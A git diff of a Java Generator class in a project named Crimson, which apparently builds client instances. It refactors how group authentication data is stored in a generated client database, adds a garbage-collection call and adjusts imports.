@@ -20,7 +20,6 @@ package com.subterranean_security.crimson.server;
 import java.io.File;
 import java.io.IOException;
 import java.io.PrintWriter;
-import java.nio.file.Files;
 import java.util.Date;
 
 import org.slf4j.Logger;
@@ -31,9 +30,11 @@ import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
+import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.storage.ClientDB;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
+import com.subterranean_security.crimson.core.util.Crypto;
 
 public class Generator {
 
@@ -68,6 +69,8 @@ public class Generator {
 		} else {
 
 		}
+
+		System.gc();
 	}
 
 	public byte[] getResult() throws IOException {
@@ -84,24 +87,14 @@ public class Generator {
 		File clientDB = new File(temp.getAbsolutePath() + "/client.db");
 		File internal = new File(temp.getAbsolutePath() + "/internal.txt");
 
-		switch (ic.getAuthType()) {
-		case GROUP:
-			ServerStore.Authentication.create(ic.getGroup(), ic.getViewerUser());
-			break;
-		case NO_AUTH:
-			break;
-		case PASSWORD:
-			break;
-		default:
-			break;
-
-		}
-
 		// create a database for the client
 		try {
 			ClientDB database = new ClientDB(clientDB);
 			database.storeObject("cvid", cvid);
 			database.storeObject("ic", new String(B64.encode(ic.toByteArray())));
+			if (ic.getAuthType() == AuthType.GROUP) {
+				database.storeObject("auth.group", ServerStore.Authentication.getGroup(ic.getGroupName()));
+			}
 
 			database.close();
 			log.debug("Created client database successfully");
